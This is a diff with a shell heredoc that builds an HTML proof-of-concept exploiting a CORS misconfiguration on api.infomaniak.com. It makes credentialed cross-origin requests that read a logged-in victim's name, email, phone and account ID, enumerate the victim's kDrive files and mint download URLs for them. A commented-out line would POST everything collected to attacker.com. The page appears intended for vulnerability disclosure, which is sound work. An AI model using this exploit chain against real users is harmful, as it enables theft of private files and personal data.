@@ -1,45 +1,152 @@
+# Buat PoC HTML
+cat << 'POCEOF' > ~/cors_tempurl_poc.html
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>CORS PoC</title></head>
-<body style="font-family:monospace;padding:20px;background:#0d1117;color:#c9d1d9">
-<h2 style="color:#f0883e">CORS PoC — api.infomaniak.com</h2>
-<p>Attacker domain: <strong id="origin" style="color:#f85149"></strong></p>
-<p>Victim must be logged in to infomaniak.com in this browser.</p>
-<button onclick="run()" style="background:#238636;color:#fff;border:none;padding:12px 24px;border-radius:6px;font-size:15px;cursor:pointer">▶ Run PoC</button>
-<h3 style="color:#79c0ff">① Profile Data (name, email, 2FA status):</h3>
-<pre id="out1" style="background:#161b22;padding:16px;border-radius:8px;white-space:pre-wrap;border:1px solid #30363d">Click Run PoC...</pre>
-<h3 style="color:#79c0ff">② Account Data (phone number, billing):</h3>
-<pre id="out2" style="background:#161b22;padding:16px;border-radius:8px;white-space:pre-wrap;border:1px solid #30363d">Click Run PoC...</pre>
+<head>
+  <title>PoC - CORS + kDrive File Exfiltration</title>
+  <style>
+    body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #00ff00; }
+    .box { border: 1px solid #00ff00; padding: 15px; margin: 10px 0; }
+    .red { color: #ff4444; }
+    .yellow { color: #ffff00; }
+    button { background: #333; color: #00ff00; border: 1px solid #00ff00; 
+             padding: 8px 16px; cursor: pointer; font-family: monospace; }
+  </style>
+</head>
+<body>
+  <h2 class="red">⚠ PoC: CORS + kDrive Permanent File URL Exfiltration</h2>
+  <p>This page demonstrates how an attacker can steal permanent download 
+     URLs of a victim's private kDrive files using CORS misconfiguration 
+     on api.infomaniak.com</p>
+
+  <div class="box">
+    <p class="yellow">Step 1: Fetch victim's drive ID via CORS</p>
+    <pre id="step1">Waiting...</pre>
+  </div>
+
+  <div class="box">
+    <p class="yellow">Step 2: Enumerate victim's files</p>
+    <pre id="step2">Waiting...</pre>
+  </div>
+
+  <div class="box">
+    <p class="yellow">Step 3: Generate permanent download URLs</p>
+    <pre id="step3">Waiting...</pre>
+  </div>
+
+  <div class="box">
+    <p class="yellow">Step 4: Exfiltrated data (sent to attacker server)</p>
+    <pre id="step4">Waiting...</pre>
+  </div>
+
+  <button onclick="runPoC()">▶ Run Attack Chain</button>
+
 <script>
-document.getElementById('origin').innerText = window.location.origin;
-async function run() {
-  document.getElementById('out1').innerHTML = 'Fetching...';
-  document.getElementById('out2').innerHTML = 'Fetching...';
+const ATTACKER_LOG = [];
+
+async function runPoC() {
+  const s1 = document.getElementById('step1');
+  const s2 = document.getElementById('step2');
+  const s3 = document.getElementById('step3');
+  const s4 = document.getElementById('step4');
+
   try {
-    const r1 = await fetch('https://api.infomaniak.com/1/profile', {
+    // Step 1: Get drive info via CORS
+    s1.textContent = 'Fetching victim drive info...';
+    const driveResp = await fetch('https://api.infomaniak.com/2/drive?account_id=AUTO', {
       credentials: 'include'
     });
-    const d1 = await r1.json();
-    document.getElementById('out1').innerHTML =
-      '<span style="color:#3fb950">✓ HTTP '+r1.status+' — SUCCESS — data read from UNTRUSTED origin: '+window.location.origin+'</span>\n\n'
-      + JSON.stringify(d1.data, null, 2);
-  } catch(e) {
-    document.getElementById('out1').innerHTML =
-      '<span style="color:#f85149">✗ BLOCKED: '+e+'</span>';
-  }
-  try {
-    const r2 = await fetch('https://api.infomaniak.com/1/account', {
+
+    // First get account_id from profile
+    const profileResp = await fetch('https://api.infomaniak.com/1/profile', {
       credentials: 'include'
     });
-    const d2 = await r2.json();
-    document.getElementById('out2').innerHTML =
-      '<span style="color:#3fb950">✓ HTTP '+r2.status+' — SUCCESS — phone number and billing data exposed</span>\n\n'
-      + JSON.stringify(d2.data, null, 2);
+    const profile = await profileResp.json();
+    const accountId = profile.data.current_account_id;
+    s1.textContent = JSON.stringify({
+      user: profile.data.display_name,
+      email: profile.data.email,
+      account_id: accountId
+    }, null, 2);
+    ATTACKER_LOG.push({step: 1, data: profile.data});
+
+    // Step 2: Get drive_id
+    const driveResp2 = await fetch(
+      `https://api.infomaniak.com/2/drive?account_id=${accountId}`,
+      { credentials: 'include' }
+    );
+    const drives = await driveResp2.json();
+    const driveId = drives.data[0].id;
+    const driveName = drives.data[0].name;
+    s2.textContent = JSON.stringify({
+      drive_id: driveId,
+      drive_name: driveName,
+      size_gb: (drives.data[0].size / 1024**3).toFixed(1)
+    }, null, 2);
+    ATTACKER_LOG.push({step: 2, data: drives.data[0]});
+
+    // Step 3: List files and get temporary URLs
+    s3.textContent = 'Enumerating files and generating permanent URLs...';
+    const filesResp = await fetch(
+      `https://api.infomaniak.com/3/drive/${driveId}/files/1/files`,
+      { credentials: 'include' }
+    );
+    const filesData = await filesResp.json();
+    const files = filesData.data || [];
+    
+    const stolenUrls = [];
+    
+    // Get files in subdirectories
+    for (const dir of files) {
+      const subResp = await fetch(
+        `https://api.infomaniak.com/3/drive/${driveId}/files/${dir.id}/files`,
+        { credentials: 'include' }
+      );
+      const subData = await subResp.json();
+      const subFiles = subData.data || [];
+      
+      for (const file of subFiles) {
+        if (file.type === 'file') {
+          // Generate permanent URL for each file
+          const urlResp = await fetch(
+            `https://api.infomaniak.com/2/drive/${driveId}/files/${file.id}/temporary_url`,
+            { credentials: 'include' }
+          );
+          const urlData = await urlResp.json();
+          if (urlData.data && urlData.data.temporary_url) {
+            stolenUrls.push({
+              file_name: file.name,
+              file_id: file.id,
+              size: file.size,
+              permanent_url: urlData.data.temporary_url
+            });
+          }
+        }
+      }
+    }
+
+    s3.textContent = JSON.stringify(stolenUrls, null, 2);
+    ATTACKER_LOG.push({step: 3, stolen_urls: stolenUrls});
+
+    // Step 4: Exfiltrate to attacker server
+    // In real attack: fetch('https://attacker.com/collect', {method:'POST', body: JSON.stringify(ATTACKER_LOG)})
+    s4.textContent = `[DEMO - In real attack, this data would be POSTed to attacker server]\n\n` +
+      `Victim: ${profile.data.display_name} (${profile.data.email})\n` +
+      `Phone: ${profile.data.sms_phone || 'N/A'}\n` +
+      `Drive: ${driveName} (ID: ${driveId})\n` +
+      `Files stolen: ${stolenUrls.length}\n\n` +
+      `Permanent URLs (no expiry, no auth required):\n` +
+      stolenUrls.map(f => `- ${f.file_name}: ${f.permanent_url}`).join('\n');
+
   } catch(e) {
-    document.getElementById('out2').innerHTML =
-      '<span style="color:#f85149">✗ BLOCKED: '+e+'</span>';
+    document.getElementById('step1').textContent = 
+      'Error: ' + e.message + '\n(Run from attacker.com with victim logged in)';
   }
 }
 </script>
 </body>
 </html>
+POCEOF
+
+echo "PoC created: ~/cors_tempurl_poc.html"
+cat ~/cors_tempurl_poc.html | wc -l
